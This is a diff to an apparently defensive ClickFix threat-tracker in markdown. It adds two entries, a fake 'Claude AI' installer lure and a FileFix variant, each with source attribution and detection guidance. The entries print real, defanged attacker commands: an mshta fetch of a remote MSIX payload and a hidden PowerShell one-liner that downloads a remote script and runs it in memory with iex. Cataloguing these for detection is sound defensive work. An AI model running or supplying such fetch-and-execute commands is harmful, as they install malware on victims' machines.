@@ -7,8 +7,8 @@ ClickFix is a social-engineering technique where a victim is tricked (fake CAPTC
 check, browser or document "error") into pasting and running an attacker-supplied command in the
 Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user's own permissions.
 
-- **Entries:** 29
-- **Last updated:** 2026-09-05
+- **Entries:** 31
+- **Last updated:** 2026-09-07
 - **Maintained by:** PAI ClickFix Tracker (daily) · source: [Sergio-Albea-Git/Threat-Hunting-KQL-Queries](https://github.com/Sergio-Albea-Git/Threat-Hunting-KQL-Queries)
 
 ## Commands
@@ -44,6 +44,8 @@ Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user
 | cf-0027 | `finger.exe` | Fake-CAPTCHA ClickFix uses the legacy finger.exe LOLBin to retrieve an attacker-hosted script over TCP/79 and pipes the response straight into cmd for execution (KongTuke and SmartApeSG campaigns). | SANS Internet Storm Center (Johannes Ullrich) |
 | cf-0028 | `osascript (Script Editor via applescript:// scheme)` | macOS ClickFix uses an applescript:// URL to open Script Editor with a tr-obfuscated AppleScript that runs curl -kSsfL to fetch a gzip stager piped into zsh, ending in Atomic Stealer (AMOS). | Jamf Threat Labs |
 | cf-0029 | `mshta.exe` | Fake 'Windows Update' ClickFix lure runs mshta against a hex-encoded-second-octet IP serving JScript from a non-.hta extension (.odd/.dat), which stages a PowerShell .NET steganographic loader hiding shellcode in PNG pixels (LummaC2/Rhadamanthys). | Huntress |
+| cf-0030 | `mshta.exe` | Fake 'Claude AI' installer ClickFix lure; victim pastes into Run dialog and mshta fetches a remote MSIX bundle payload leading to staged PowerShell + process injection | Rapid7 Labs |
+| cf-0031 | `powershell.exe` | FileFix (evolved ClickFix) — command pasted into the File Explorer address bar with a legit-looking path after '#'; uses legacy Microsoft.XMLHTTP COM to pull and iex-execute a remote PS1 in memory | Bridewell |
 
 ### cf-0001 — `powershell.exe`
 
@@ -363,6 +365,28 @@ mshta hxxp://141[.]0x62[.]80[.]175/tick.odd
 - **Detection:** Hunt mshta.exe fetching URLs with hex-octet IPs (e.g. 0x62) and non-HTML extensions like .odd/.dat, then mshta spawning powershell.exe with in-memory download activity.
 - **Source:** Huntress — hxxps://www[.]huntress[.]com/blog/clickfix-malware-buried-in-images
 - **Added:** 2025-11-24
+
+### cf-0030 — `mshta.exe`
+
+```text
+mshta hxxp://download-version[.]1-5-8[.]com/claude.msixbundle
+```
+
+- **Technique:** Fake 'Claude AI' installer ClickFix lure; victim pastes into Run dialog and mshta fetches a remote MSIX bundle payload leading to staged PowerShell + process injection
+- **Detection:** Alert on mshta.exe with a remote http/https URL argument, especially fetching .msixbundle/.msix; correlate with new entries in HKCU\...\Explorer\RunMRU
+- **Source:** Rapid7 Labs — hxxps://www[.]rapid7[.]com/blog/post/ve-clickfix-phishing-campaign-fake-claude-installer/
+- **Added:** 2026-04-09
+
+### cf-0031 — `powershell.exe`
+
+```text
+powershell -w h -nop -c "$ic='hxxps://tersmoles[.]com/script.ps1';$w=New-Object -Com Microsoft.XMLHTTP;$w.open('GET',$ic,$false);$w.send();iex([Text.Encoding]::UTF8.GetString($w.responseBody))"
+```
+
+- **Technique:** FileFix (evolved ClickFix) — command pasted into the File Explorer address bar with a legit-looking path after '#'; uses legacy Microsoft.XMLHTTP COM to pull and iex-execute a remote PS1 in memory
+- **Detection:** Alert on explorer.exe or msedge.exe spawning powershell.exe that instantiates the Microsoft.XMLHTTP COM object and pipes responseBody to iex; hunt '-w h -nop' one-liners from browser/Explorer parents
+- **Source:** Bridewell — hxxps://www[.]bridewell[.]com/insights/blogs/detail/filefix-the-evolved-clickfix
+- **Added:** 2025-08-22
 
 ## Threat Hunting (KQL — Microsoft Defender XDR)
 
